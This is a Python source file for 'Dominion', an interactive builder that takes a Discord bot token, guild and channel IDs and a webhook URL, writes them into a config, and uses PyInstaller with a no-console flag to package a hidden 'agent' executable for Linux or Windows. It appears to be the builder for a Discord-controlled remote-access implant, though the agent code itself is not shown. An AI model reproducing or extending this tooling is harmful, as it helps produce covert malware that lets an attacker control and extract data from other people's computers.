#!/usr/bin/env python3

import subprocess
import os
from shutil import which
from colorama import Fore, init


class DominionBuilder:
    def __init__(self):
        self.config = {
            "guild-id": "",
            "bot-token": "",
            "channel-id": "",
            "webhook": ""
        }
        self.commands = {
            "set": self.set_option,
            "build": self.build,
            "help": self.print_help,
            "exit": self.exit_builder,
            "show": self.show_options
        }



    def print_banner(self):
        """Prints the ASCII art banner."""
        banner = r"""
                                                                                
 ▄▄▄▄▄                            ██                  ██                        
 ██▀▀▀██                          ▀▀                  ▀▀                        
 ██    ██   ▄████▄   ████▄██▄   ████     ██▄████▄   ████      ▄████▄   ██▄████▄ 
 ██    ██  ██▀  ▀██  ██ ██ ██     ██     ██▀   ██     ██     ██▀  ▀██  ██▀   ██ 
 ██    ██  ██    ██  ██ ██ ██     ██     ██    ██     ██     ██    ██  ██    ██ 
 ██▄▄▄██   ▀██▄▄██▀  ██ ██ ██  ▄▄▄██▄▄▄  ██    ██  ▄▄▄██▄▄▄  ▀██▄▄██▀  ██    ██ 
 ▀▀▀▀▀       ▀▀▀▀    ▀▀ ▀▀ ▀▀  ▀▀▀▀▀▀▀▀  ▀▀    ▀▀  ▀▀▀▀▀▀▀▀    ▀▀▀▀    ▀▀    ▀▀ 
                                                                                
                                                                                
        """
        print(banner)

    def print_help(self, *args):
        """Prints the help message."""
        print("\nCommands:")
        print("  set <option> <value>  - Set a configuration option.")
        print("  show                  - Show the current configuration.")
        print("  build <os>            - Build the Dominion agent for 'linux' or 'windows'.")
        print("  help                  - Show this help message.")
        print("  exit                  - Exit the builder.")
        print("\nOptions:")
        for option in self.config:
            print(f"  {option}")
        print()

    def show_options(self, *args):
        """Shows the current configuration."""
        print("\nCurrent Configuration:")
        for option, value in self.config.items():
            display_value = value if value else "Not Set"
            print(f"  {option}: {display_value}")
        print()

    def set_option(self, *args):
        """Sets a configuration option."""
        if len(args) >= 2:
            option, value = args[0], " ".join(args[1:])
            if option in self.config:
                self.config[option] = value
                print(f"[+] {option} => {value}")
                if option == "bot-token":
                    print("[!] INFO: Ensure this is a valid bot token from your Discord Developer Portal application.")
            else:
                print(f"[-] Invalid option: {option}")
        else:
            print("[-] Usage: set <option> <value>")

    def _check_deps(self, target_os):
        """Checks for necessary build dependencies."""
        if not which("pyinstaller"):
            print("[-] PyInstaller not found. Please run install.sh as root.")
            return False
        if target_os == "windows" and not which("wine"):
            print("[-] Wine not found. Please install it to build for Windows (e.g., 'sudo apt install wine').")
            return False
        return True

    def build(self, *args):
        """Builds the Dominion agent for a specific OS."""
        if not args:
            print("[-] Usage: build <os> (e.g., build linux)")
            return

        target_os = args[0].lower()
        if target_os not in ["linux", "windows"]:
            print(f"[-] Invalid build target: {target_os}. Use 'linux' or 'windows'.")
            return

        if not self._check_deps(target_os):
            return

        print(f"[+] Starting build for {target_os}...")

        for option, value in self.config.items():
            if not value:
                print(f"[-] Please set the '{option}' before building.")
                return

        with open("config.py", "w") as f:
            f.write(f'GUILD_ID = "{self.config["guild-id"]}"\n')
            f.write(f'BOT_TOKEN = "{self.config["bot-token"]}"\n')
            f.write(f'CHANNEL_ID = "{self.config["channel-id"]}"\n')
            f.write(f'WEBHOOK_URL = "{self.config["webhook"]}"\n')
            f.write('COMMAND_PREFIX = "!"\n')

        print("[+] Configuration saved to config.py")

        build_command = [
            "pyinstaller", "--onefile", "--noconsole", "--clean",
            "--name", f"dominion-{target_os}", "start.py"
        ]

        if target_os == "windows":
            # For Windows, we need to use wine and a windows version of python/pyinstaller
            # This is a simplified approach. A more robust solution would use a dedicated wine prefix.
            print("[!] Windows builds on Linux can be complex. This is a best-effort attempt.")
            print("[!] Make sure you have a Python installation inside your Wine environment.")
            build_command.insert(0, "wine")
            # The command needs to point to the pyinstaller.exe inside wine
            # This is a common path, but may vary
            build_command[1] = os.path.expanduser("~/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python311/Scripts/pyinstaller.exe")


        try:
            print(f"[+] Running command: {" ".join(build_command)}")
            subprocess.run(build_command, check=True)
            print(f"[+] Build successful! Check the 'dist' directory for the executable.")
        except subprocess.CalledProcessError as e:
            print(f"[-] Build failed: {e}")
            if target_os == "windows":
                print("[-] Windows build may have failed due to missing Python/PyInstaller in the Wine environment.")
        except FileNotFoundError:
            print(f"[-] Command not found. Ensure {" and ".join(build_command)} is in your PATH.")


    def exit_builder(self, *args):
        """Exits the builder."""
        print("Exiting Dominion builder.")
        exit(0)

    def run(self):
        """Runs the builder's interactive shell."""
        self.print_banner()
        self.print_help()
        while True:
            try:
                prompt = "Dominion > "
                user_input = input(prompt).strip().split()
                if user_input:
                    command = user_input[0].lower()
                    args = user_input[1:]
                    if command in self.commands:
                        self.commands[command](*args)
                    else:
                        print(f"[-] Unknown command: {command}")
            except KeyboardInterrupt:
                print()
                self.exit_builder()
            except EOFError:
                print()
                self.exit_builder()

if __name__ == "__main__":
    builder = DominionBuilder()
    builder.run()